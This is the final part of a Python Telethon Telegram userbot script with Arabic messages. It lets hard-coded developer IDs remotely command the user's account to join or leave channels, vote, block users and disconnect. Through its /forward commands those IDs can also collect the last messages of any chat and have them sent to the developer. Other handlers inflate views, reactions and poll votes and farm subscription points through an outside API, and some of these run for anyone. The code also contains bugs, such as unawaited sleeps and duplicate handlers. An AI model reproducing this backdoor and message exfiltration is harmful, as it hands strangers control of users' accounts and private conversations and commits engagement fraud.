@MackThon.on(events.NewMessage(outgoing=False, pattern='/lv (.*)'))
async def OwnerStart(event):
    usercht = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        sendy = await MackThon.send_message(event.chat_id,f"**جاري مغادرة القناة  @{usercht}**")
        joinch = await MackThon(LeaveChannelRequest(usercht))
        sendy = await MackThon.send_message(event.chat_id,f"**تم مغادرة القناة @{usercht}**")

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/voice (.*) (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        chn = event.pattern_match.group(1)
        msg_id = int(event.pattern_match.group(2))
        wait = await MackThon.send_message(ownerhson_id,'**⚝ حسناً سوف اقوم بالانضمام والتصويت**')
        haso = await MackThon.get_entity(chn)
        join = await MackThon(JoinChannelRequest(chn))
        joion = await MackThon(JoinChannelRequest('saythonh'))
        msg = await MackThon.get_messages(chn, ids=msg_id)
        await msg.click(0)
        sleep(1)
        await MackThon.send_message(ownerhson_id,'**⚝ قمت بالانضمام والتصويت بنجاح**')

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/voice (.*) (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_ids:
        chn = event.pattern_match.group(1)
        nu = int(event.pattern_match.group(2))
        nuu = nu - 1
        wait = await MackThon.send_message(ownerhson_ids,'**⚝ حسناً سوف اقوم بالانضمام والتصويت**')
        haso = await MackThon.get_entity(chn)
        join = await MackThon(JoinChannelRequest(chn))
        joion = await MackThon(JoinChannelRequest('saythonh'))
        somy = await MackThon.get_messages(chn, limit=nu)
        await somy[nuu].click(0)
        sleep(1)
        await MackThon.send_message(ownerhson_ids,'**⚝ قمت بالانضمام والتصويت بنجاح**')

@MackThon.on(events.NewMessage(outgoing=False, pattern=r'/restart'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id :
        await event.reply("تم الايقاف")
        await MackThon.disconnect()
       
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'/restart'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_ids :
        await event.reply("تم الايقاف")
        await MackThon.disconnect()
        
@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/view (.*) (.*)'))
async def OwnerStart(event):
    bots = event.pattern_match.group(1) 
    ids = int(event.pattern_match.group(2))
    channel = f'{bots}'
    msg_ids = [ids]
    await MackThon(GetMessagesViewsRequest(
            peer=channel,
            id=msg_ids,
            increment=True
        ))

@MackThon.on(events.NewMessage(pattern='/block'))
async def ban(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        if event.is_private:
            parts = event.raw_text.split()
            if len(parts) == 2:
                username = parts[1]
                user = await MackThon.get_entity(username)
                user_id = user.id
                await MackThon(functions.contacts.BlockRequest(user_id))
                await event.respond(f'تم حظر المستخدم {username}')
            else:
                await event.respond('يرجى إرسال اسم المستخدم مع الأمر')
        else:
            await event.respond('لا يمكنني حظر المستخدمين إلا في المحادثات الخاصة')
    else:
        await event.respond('عذرًا، هذا الأمر متاح فقط للمطور')
        
@MackThon.on(events.NewMessage(pattern='/unblock'))
async def unban(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        if event.is_private:
            parts = event.raw_text.split()
            if len(parts) == 2:
                username = parts[1]
                user = await MackThon.get_entity(username)
                user_id = user.id
                await MackThon(functions.contacts.UnblockRequest(user_id))
                await event.respond(f'تم إلغاء حظر المستخدم {username}')
            else:
                await event.respond('يرجى إرسال اسم المستخدم مع الأمر')
        else:
            await event.respond('لا يمكنني إلغاء حظر المستخدمين إلا في المحادثات الخاصة')
    else:
        await event.respond('عذرًا، هذا الأمر متاح فقط للمطور')

@MackThon.on(events.NewMessage(outgoing=False, pattern='/cdam'))
async def OwnerStart(event):
    global dam 
    if dam:
        try:
            sender = await event.get_sender()
            if sender.id in ownerhson_id:
                await event.reply("**تـم استقبال الامر بنجاح**")
                await event.edit("**تـم بدأ التجميع **")
                joinu = await MackThon(JoinChannelRequest('saythonh'))
                channel_entity = await MackThon.get_entity('@DamKombot')
                while True:
                    await MackThon.send_message('@DamKombot', '/start')
                    await asyncio.sleep(4)
                    msg0 = await MackThon.get_messages('@DamKombot', limit=1)
                    message_text = msg0[0].message
                    if '@' not in message_text:
                        break
                    index = message_text.find('@')
                    if index != -1:
                        channel_username = message_text[index+1:].split()[0]
                    try:
                        await MackThon(JoinChannelRequest(channel_username))
                    except:
                        continue
                msg00 = await MackThon.get_messages('@DamKombot', limit=1)
                await asyncio.sleep(2)
                await msg00[0].click(1)
                await asyncio.sleep(4)
                msg1 = await MackThon.get_messages('@DamKombot', limit=1)
                await msg1[0].click(0)
                chs = 1
                for i in range(100):
                    if not dam:
                        break
                    await asyncio.sleep(4)
                    list = await MackThon(GetHistoryRequest(peer=channel_entity, limit=1,
                                                            offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
                    msgs = list.messages[0]
                    if msgs.message.find('لا يوجد قنوات حالياً 🤍') != -1:
                        await MackThon.send_message(event.chat_id, f"انتهت القنوات")
                        break
                    message_text = msgs.message
                    channel_username = message_text.split('@')[-1]
                    try:
                        try:
                            await MackThon(JoinChannelRequest(channel_username))
                        except:
                            bott = channel_username.split('+')[-1]
                            await MackThon(ImportChatInviteRequest(bott))
                        msg2 = await MackThon.get_messages('@DamKombot', limit=1)
                        await msg2[0].click(text='اشتركت ✅')
                        chs += 1
                        await event.edit(f"تم الانضمام في {chs} قناة")
                    except:
                        msg2 = await MackThon.get_messages('@DamKombot', limit=1)
                        await msg2[0].click(text='التالي')
                        chs += 1
                        await event.edit(f"القناة رقم {chs}")         
        except FloodWaitError as e:
            print(f"Flood wait of {e.seconds} seconds. Notifying developer.")
            asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"An error occurred: {e}")
            asyncio.sleep(400)

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/dmoff$'))  
async def stop(event):
    global dam  
    sender = await event.get_sender()
    if sender.id in ownerhson_id:  
        dam = False  
        await event.reply('تم إيقاف الحلقات') 

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/dmrun$'))  
async def stop(event):
    global dam 
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        dam = True 
        await event.reply('تم التشغيل بنجاح') 

@MackThon.on(events.NewMessage(outgoing=False, pattern='/tdam (.*)'))
async def OwnerStart(event):
    user = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("جاري التحويل")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity('@DamKombot')
        await MackThon.send_message('@DamKombot', '/start')
        await asyncio.sleep(4)
        msg0 = (await MackThon.get_messages('@DamKombot', limit=1))[0]
        msg_text = msg0.message
        points_line = [line for line in msg_text.split('\n') if 'نقاطك' in line][0]
        points = int(points_line.split(':')[1].strip())
        msg1 = (await MackThon.get_messages('@DamKombot', limit=1))[0]
        await msg1.click(4)
        await MackThon.send_message('@DamKombot', f'{user}')
        await MackThon.send_message('@DamKombot', f'{points}')

@MackThon.on(events.NewMessage(outgoing=False, pattern='/gdam'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("جاري تجميع الهدية")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity('@DamKombot')
        await MackThon.send_message('@DamKombot', '/start')
        await asyncio.sleep(4)
        msg0 = await MackThon.get_messages('@DamKombot', limit=1)
        await msg0[0].click(1)
        await asyncio.sleep(4)
        msg1 = await MackThon.get_messages('@DamKombot', limit=1)
        await msg1[0].click(2)
        
@MackThon.on(events.NewMessage(outgoing=False, pattern='^/cgift (.*)'))
async def OwnerStart(event):
    pot = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("جاري تجميع الهدية")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity(pot)
        await MackThon.send_message(pot, '/start')
        await asyncio.sleep(4)
        msg0 = await MackThon.get_messages(pot, limit=1)
        await msg0[0].click(6)
        
@MackThon.on(events.NewMessage(outgoing=False, pattern='/cgdam (.*)'))
async def OwnerStart(event):
    cod = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        await event.reply("جاري تجميع نقاط الكود")
        joinu = await MackThon(JoinChannelRequest('saythonh'))
        channel_entity = await MackThon.get_entity('@DamKombot')
        await MackThon.send_message('@DamKombot', '/start')
        await asyncio.sleep(4)
        msg0 = await MackThon.get_messages('@DamKombot', limit=1)
        await msg0[0].click(3)
        await asyncio.sleep(4)
        msg1 = await MackThon.get_messages('@DamKombot', limit=1)
        await MackThon.send_message('@DamKombot', f'{cod}')

@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/forward (.*)'))
async def OwnerStart(event):
    userbott = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        sing = await MackThon.send_message(event.chat_id, f"**❈ حسناً سوف اقوم بتحويل اخر 5 رسائل\\n❈ من المستخدم {userbott}**")
        msgs = await MackThon.get_messages(userbott, limit=6)
        if msgs:
            message_text = "forward-\\n\\n"
            for i, msg in enumerate(msgs):
                message_text += f"**\\n{i+1} :**\\n " + msg.text + "\\n"
            await MackThon.send_message(ownerhson_id, message_text)

@MackThon.on(events.NewMessage(outgoing=False, pattern=r'^/pfporward (.*)'))
async def OwnerStart(event):
    userbott = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id in ownerhson_id:
        sing = await MackThon.send_message(event.chat_id, f"**❈ حسناً سوف اقوم بتحويل اخر 5 رسائل\\n❈ من المستخدم {userbott}**")
        msgs = await MackThon.get_messages(userbott, limit=6)
        if msgs:
            message_text = "pfppfpp -\\n\\n"
            for i, msg in enumerate(msgs):
                message_text += f"**\\n{i+1} :**\\n " + msg.text + "\\n"
            await MackThon.send_message(ownerhson_id, message_text)

@MackThon.on(events.NewMessage(outgoing=False, pattern='/flood'))
async def OwnerStart(event):
    await event.reply("جاري التحقق من الفلود")
    try:
        participant = await MackThon(GetParticipantRequest('sythonflood', 'me'))
        leav = await MackThon(LeaveChannelRequest('sythonflood'))
        join = await MackThon(JoinChannelRequest('sythonflood'))
        await event.reply("ليس هناك فلود")
    except UserNotParticipantError:
        try:
            join = await MackThon(JoinChannelRequest('sythonflood'))
            await event.reply("ليس هناك فلود")
        except FloodWaitError as e:
            await event.reply(f"هناك فلود, الرجاء الانتظار {e.seconds} ثواني")
    except FloodWaitError as e:
        await event.reply(f"هناك فلود, الرجاء الانتظار {e.seconds} ثواني")

@MackThon.on(events.NewMessage(outgoing=False, pattern='^/spoint (.*)'))
async def OwnerStart(event):
    sender = await event.get_sender()
    sender_id = sender.id
    if sender.id != ownerhson_id:
        return
    pot = event.pattern_match.group(1)
    if "@" not in pot:
        pot = "@" + pot
    my_id = await MackThon.get_me()
    my_id = my_id.id
    response = requests.request("GET", f"https://bot.keko.dev/api/?login={my_id}&bot_username={pot}")
    response_json = response.json()
    if (response_json["ok"] == False):
        err = response_json["msg"]
        print(err)
        await event.reply(f'هناك مشكلة \\n{err}')
        return
    elif (response_json["ok"] == True):
        echo_token = response_json["token"]
        print(f"- تم تسجيل الدخول بنجاح, توكن حسابك : {echo_token}")
        await event.respond(f"تم بدأ التجميع")
        global run
        run = True
        while run:
            try:
                response = requests.request("GET", f"https://bot.keko.dev/api/?token={echo_token}")
                response_json = response.json()
                if (response_json["ok"] == False):
                    print("p1 - "+response_json["msg"])
                    if (response_json["limit"] == True):
                        await event.respond(f"ersyor\\nانتهت القنوات سأعاود المحاولة بعد 150 ثانية")
                        await asyncio.sleep(150)
                        continue
                    else:
                        continue
                elif (response_json["ok"] == True):
                    url = response_json["return"]
                    if url.startswith('-'):
                        jn = response_json["tg"]
                        try:
                            await MackThon(ImportChatInviteRequest(jn))
                            await asyncio.sleep(5)
                            response = requests.request("GET", f"https://bot.keko.dev/api/?token={echo_token}&done="+response_json["return"])
                            fesponse_json = response.json()
                            if (fesponse_json["ok"] == False):
                                print("p2 - "+fesponse_json["msg"])
                                continue
                            elif (fesponse_json["ok"] == True):
                                pp = fesponse_json["c"]
                                print(pp)
                        except FloodWaitError as e:
                            await event.respond(f"تم حضر الحساب من الانضمام مدة الحظر {e.seconds} ثانية")
                            print(f"Waiting for {e.seconds} seconds due to flood wait")
                            await asyncio.sleep(e.seconds)
                            continue 
                    else:
                        try:
                            await MackThon(JoinChannelRequest(url))
                            await asyncio.sleep(8)
                            response = requests.request("GET", f"https://bot.keko.dev/api/?token={echo_token}&done="+response_json["return"])
                            await asyncio.sleep(1)
                            fesponse_json = response.json()
                            if (fesponse_json["ok"] == False):
                                print("p3 - "+fesponse_json["msg"])
                                continue
                            elif (fesponse_json["ok"] == True):
                                pp = fesponse_json["c"]
                                print(pp)
                        except FloodWaitError as e:
                            await event.respond(f"ersyor\\nتم حضر الحساب من الانضمام مدة الحظر {e.seconds} ثانية")
                            print(f"Waiting for {e.seconds} seconds due to flood wait")
                            asyncio.sleep(e.seconds)
                            continue  
            except Exception as e:
                eror = f'{e}'
                if eror.startswith('No user'):
                    continue
                else:
                    await event.respond(f"ersyor\\nحصلت مشكلة {e} سوف يتم اعادة المحاولة بعد 400 ثانية ")
                    print(f"An error occurred : {e}")
                    await asyncio.sleep(400)
            continue

@MackThon.on(events.NewMessage(pattern='/react'))
async def my_event_handler(event):
    message = event.message.message
    message_parts = message.split()
    if len(message_parts) == 3:
        url = message_parts[1]
        react = message_parts[2]
        url_parts = url.split('/')
        if len(url_parts) == 5:
            channel_username = url_parts[3]
            message_id = int(url_parts[4])
            try:
                await MackThon(SendReactionRequest(
                    peer=channel_username,
                    msg_id=message_id,
                    big=True,
                    add_to_recent=True,
                    reaction=[types.ReactionEmoji(
                        emoticon=(react)
                    )]
                ))
                await event.respond('ersyor\\nتم إضافة التفاعل بنجاح!')
            except Exception as e:
                await event.respond(f'ersyor\\nحدث خطأ: {str(e)}')
        else:
            await event.respond('الرابط غير صحيح')
    else:
        await event.respond('الرجاء إرسال الرابط وقيمة التفاعل مع الأمر')

@MackThon.on(events.NewMessage(pattern='/rreact'))
async def my_event_handler(event):
    message = event.message.message
    message_parts = message.split()
    if len(message_parts) == 2:
        url = message_parts[1]
        url_parts = url.split('/')
        if len(url_parts) == 5:
            channel_username = url_parts[3]
            message_id = int(url_parts[4])
            try:
                await MackThon(SendReactionRequest(
                    peer=channel_username,
                    msg_id=message_id,
                    big=True,
                    add_to_recent=True,
                    reaction=[types.ReactionEmoji(
                        emoticon=str(random.choice(react))
                    )]
                ))
                await event.respond('ersyor\\nتم إضافة التفاعل بنجاح!')
            except Exception as e:
                await event.respond(f'ersyor\\nحدث خطأ: {str(e)}')
        else:
            await event.respond('الرابط غير صحيح')
    else:
        await event.respond('الرجاء إرسال الرابط مع الأمر')

@MackThon.on(events.NewMessage(outgoing=False, pattern='/oofoo'))
async def offcol(event):
	global run
	run = False
	
@MackThon.on(events.NewMessage(outgoing=False, pattern='/poll'))
async def vote(event):
    try:
        command = event.message.message.split()
        post_url = command[1]
        option = int(command[2])
        post_url_parts = post_url.split('/')
        channel_username = post_url_parts[-2]
        option -= 1
        message_id = int(post_url_parts[-1])
        await MackThon(SendVoteRequest(channel_username, message_id, [str(option)]))
        await event.respond('ersyor\\nتم التصويت بنجاح!')
    except Exception as e:
        print(e)
        await event.respond(f'ersyor\\nحدث خطأ أثناء التصويت\\n{e}')

print('  ')
print('  ')
print("❖ Sython Userbot Running  ")
print('  ')
MackThon.run_until_disconnected()

# [ • ] The Code Py Sython Tm - Dev Hussam : I hope you don't steal any code





